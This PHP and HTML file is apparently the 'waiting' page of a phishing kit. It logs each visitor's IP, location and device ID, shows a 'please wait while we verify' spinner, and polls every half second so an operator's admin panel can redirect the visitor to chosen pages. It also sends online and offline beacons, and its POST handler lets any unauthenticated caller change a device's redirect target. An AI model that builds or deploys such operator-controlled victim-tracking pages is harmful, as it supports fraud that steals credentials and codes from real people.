<?php
require_once 'functions.php';
session_start();

$info = get_user_info();
$ip = $info['ip'];
$device = get_device_id();

// Forzar que al cargarse waiting.php se establezca currentPage en "waiting.php"
// Esto sobre-escribe cualquier valor previo que se haya configurado desde el panel de admin.
$data = load_data();
if (!isset($data[$device])) {
    // Si no existe el registro, lo crea
    update_user($ip, $info['location'], "waiting.php");
} else {
    // Si ya existe, se actualiza currentPage a "waiting.php" sin importar su valor previo.
    $data[$device]['currentPage'] = "waiting.php";
    save_data($data);
}

// (Opcional) Si deseas también permitir que desde un POST se cambie la redirección (por ejemplo, desde el admin),
// puedes dejar el bloque POST, pero normalmente este código se utiliza en waiting.php, y no se procesa en cada carga.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['device']) && isset($_POST['redirect'])) {
    $data = load_data();
    if (isset($data[$_POST['device']])) {
        $data[$_POST['device']]['currentPage'] = $_POST['redirect'];
        save_data($data);
        echo json_encode(["redirect" => $_POST['redirect']]);
        exit();
    }
}

// Leer el estado actual (ya debería ser "waiting.php")
$data = load_data();
$currentPage = isset($data[$device]['currentPage']) ? $data[$device]['currentPage'] : "waiting.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loader</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .loader-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100px;
        }
        .loader {
            border: 12px solid #f3f3f3;
            border-top: 12px solid #007BFF;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 15px;
            font-size: 16px;
            color: #333;
        }
    </style>
    <!-- Asegúrate de incluir jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        // Consulta el endpoint de redirección cada 500 ms
        function checkRedirect() {
            $.getJSON("check_redirect.php", function(data) {
                // Si el currentPage que devuelve no es "waiting.php", redirige
                if (data.currentPage && data.currentPage !== "waiting.php") {
                    window.location.href = data.currentPage;
                }
            });
        }
        setInterval(checkRedirect, 500);
    </script>
</head>
<body>
<script>
setInterval(function(){
    fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
}, 5000);

window.addEventListener('unload', function(){
    navigator.sendBeacon('functions.php?action=offline');
});
</script>
    <div class="loader-container">
        <img src="content/logo.gif" alt="Logo" class="logo">
        <div class="loader-wrapper">
            <div class="loader"></div>
        </div>
        <span class="message">Espere por favor mientras verificamos...</span>
    </div>
</body>
</html>
